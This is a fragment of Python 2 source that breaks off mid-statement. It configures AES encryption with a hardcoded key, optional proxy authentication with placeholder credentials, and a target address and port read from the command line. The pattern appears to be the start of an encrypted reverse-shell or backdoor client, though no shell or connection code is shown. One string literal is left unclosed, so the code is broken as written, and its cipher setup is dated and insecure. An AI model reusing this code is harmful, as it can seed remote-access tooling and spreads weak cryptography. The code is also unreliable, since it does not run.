BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
random = "sdfdsfdsdfsfd@
cipher = AES.new(secret)
PROXY_SUPPORT = "OFF"
PROXY_URL = "http://proxystuff:80"
USERNAME = "username_here"
PASSWORD = "password_here"
if PROXY_SUPPORT == "ON":
	auth_handler = urllib2.HTTPBasicAuthHandler()
	auth_handler.add_password(realm='RESTRICTED ACCESS', uri=PROXY_URL,
							  user=USERNAME, passwd=PASSWORD)
	opener = urllib2.build_opener(auth_handler)
	urllib2.install_opener(opener)
try:
	address = sys.argv[1]
	port = sys.argv[2]
except In